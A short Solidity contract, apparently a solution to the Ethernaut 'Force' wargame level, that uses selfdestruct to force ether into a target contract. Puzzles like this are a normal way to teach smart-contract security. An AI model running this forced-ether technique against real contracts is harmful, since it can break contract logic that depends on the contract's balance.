// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {        
        /**
         * selfdestruct removes all bytecode from contract address
         * and sends all ether stored to the specified address 
         * Since msg.value has non-zero ether, that will all be sent when 
         * we call selfdestruct
         */
        address payable addr = payable(contractAddress);
        selfdestruct(addr);
    }
}
